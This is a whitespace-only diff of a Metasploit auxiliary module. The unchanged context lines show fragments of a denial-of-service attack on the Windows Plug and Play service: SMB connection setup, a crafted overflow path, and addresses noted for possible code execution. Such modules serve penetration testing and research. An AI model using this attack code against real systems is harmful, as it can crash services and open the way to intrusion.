@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -15,22 +15,22 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	
+
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
 			'Description'    => %q{
 				This module triggers a stack overflow in the Windows Plug
 				and Play service. This vulnerability can be exploited on
 				Windows 2000 without a valid user account. Since the PnP
 				service runs inside the service.exe process, this module
-				will result in a forced reboot on Windows 2000. Obtaining 
+				will result in a forced reboot on Windows 2000. Obtaining
 				code execution is possible if user-controlled memory can
-				be placed at 0x00000030, 0x0030005C, or 0x005C005C. 
+				be placed at 0x00000030, 0x0030005C, or 0x005C005C.
 			},
 			'Author'         => [ 'hdm' ],
 			'License'        => MSF_LICENSE,
@@ -43,12 +43,12 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '18830' ]
 				]
 			))
-			
+
 		register_options(
 			[
 				OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
 			], self.class)
-						
+
 	end
 
 =begin
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Determine which pipe to use
 		pipe = datastore['SMBPIPE']
-		
+
 		print_status("Connecting to the SMB service...")
 		connect()
 		smb_login()
@@ -91,12 +91,12 @@ class Metasploit3 < Msf::Auxiliary
 		path = "HTREE\\ROOT" + ("\\" * i)
 
 		# 0 = nil, 1 = enum, 2/3 = services, 4 = enum (currentcontrolset|caps)
-		
-		stubdata = 
+
+		stubdata =
 			NDR.long(rand(0xffffffff)) +
-			NDR.wstring(path) +			
+			NDR.wstring(path) +
 			NDR.long(4) +
-			NDR.long(1) + 
+			NDR.long(1) +
 
 		print_status("Calling the vulnerable function...")
 
@@ -111,8 +111,8 @@ class Metasploit3 < Msf::Auxiliary
 				raise e
 			end
 		end
-		
-		disconnect	
+
+		disconnect
 	end
 
 end
